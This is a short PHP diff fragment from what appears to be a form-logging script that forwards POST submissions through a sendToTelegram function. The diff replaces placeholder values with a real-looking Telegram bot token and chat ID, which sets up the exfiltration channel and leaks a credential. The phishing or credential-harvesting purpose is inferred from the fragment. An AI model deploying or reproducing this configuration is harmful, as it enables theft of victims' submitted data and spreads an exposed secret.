@@ -17,8 +17,8 @@ function sendToTelegram($message, $token, $chat_id) {
     file_get_contents($url, false, $context);
 }
 
-$bot_token = "YOUR_BOT_TOKEN";  // Replace with your bot's token
-$chat_id = "YOUR_CHAT_ID";      // Replace with your chat ID
+$bot_token = "7712484168:AAGlbiVYuf8WH5ElQaD9G5uAaDgRMcuXrQg";  // Replace with your bot's token
+$chat_id = "7438329471";      // Replace with your chat ID
 
 // Start logging if form is submitted
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
